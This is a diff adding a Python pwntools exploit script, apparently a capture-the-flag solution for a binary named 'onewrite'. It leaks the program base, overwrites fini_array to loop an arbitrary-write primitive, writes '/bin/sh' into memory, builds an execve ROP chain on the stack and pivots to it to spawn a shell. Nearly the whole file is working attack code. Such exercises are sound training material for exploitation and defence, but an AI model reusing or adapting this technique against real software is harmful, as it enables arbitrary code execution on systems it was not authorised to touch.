@@ -1,0 +1,85 @@
+from pwn import *
+
+# overwrite main_func address to [fini_array + 8]
+# overwrite __libc_csu_fini func address to [fini_array]
+# then you got infinity loop, but becareful the the rsp after each loop
+
+p = process("./onewrite")
+'''
+p = gdb.debug("./onewrite", gdbscript = 
+b *do_overwrite + 71
+)
+'''
+
+e = ELF("./onewrite")
+fini_array = 0x2adfb0
+do_leak = e.symbols['do_leak']
+libc_csu_fini = e.symbols['__libc_csu_fini']
+
+p.sendafter(b"2. pie", b"2")
+p.recvuntil(b"> ")
+code_base = int(p.recvline(), 16) - e.symbols['do_leak']
+print(hex(code_base))
+
+# magic here
+
+p.sendafter(b"address : ", f"{code_base + fini_array + 8}".encode())
+p.sendafter(b"data : ", p64(code_base + do_leak))
+
+p.sendafter(b"2. pie", b"1")
+p.sendafter(b"address : ", f"{code_base + fini_array}".encode())
+p.sendafter(b"data : ", p64(code_base + libc_csu_fini))
+
+# end of magic
+
+def send_data(addr, val):
+    # some how rsp -= 0x20 every loop
+    p.sendafter(b"2. pie", b"1")
+    #p.recvuntil(b"> ")
+    #stack_leak = int(p.recvline(), 16)
+    #print(hex(stack_leak))
+    p.sendafter(b"address : ", f"{addr}".encode())
+    p.sendafter(b"data : ", val)
+
+pop_rdi = code_base + 0x00000000000084fa
+pop_rsi = code_base + 0x000000000000d9f2
+pop_rdx = code_base + 0x00000000000484c5
+syscall = code_base + 0x000000000000917c
+rw_section = code_base + 0x2ad4a0
+add_rsp_d8 = code_base + 0x000000000001032b
+pop_rax = code_base + 0x00000000000460ac
+ret = pop_rdi + 1
+
+p.sendafter(b"2. pie", b"1")
+p.recvuntil(b"> ")
+stack_leak = int(p.recvline(), 16)
+print(hex(stack_leak))
+# somehow data dont change
+rop_addr = stack_leak + 0x78
+p.sendafter(b"address : ", f"{rw_section}".encode())
+p.sendafter(b"data : ", b"/bin/sh\x00")
+
+send_data(rop_addr + 0x00, p64(pop_rdi))
+send_data(rop_addr + 0x08, p64(rw_section))
+send_data(rop_addr + 0x10, p64(pop_rsi))
+send_data(rop_addr + 0x18, p64(0))
+send_data(rop_addr + 0x20, p64(pop_rdx))
+send_data(rop_addr + 0x28, p64(0))
+send_data(rop_addr + 0x30, p64(pop_rax))
+send_data(rop_addr + 0x38, p64(0x3b))
+send_data(rop_addr + 0x40, p64(syscall))
+
+p.sendafter(b"2. pie", b"1")
+p.recvuntil(b"> ")
+stack_leak = int(p.recvline(), 16)
+print(hex(stack_leak))
+print("stop")
+p.sendafter(b"address : ", f"{stack_leak + 0xd8}".encode())
+p.sendafter(b"data : ", p64(add_rsp_d8))
+
+p.sendafter(b"2. pie", b"1")
+print("stop 2")
+p.sendafter(b"address : ", f"{stack_leak - 0x20 + 0x18}".encode())
+p.sendafter(b"data : ", p64(add_rsp_d8))
+
+p.interactive()
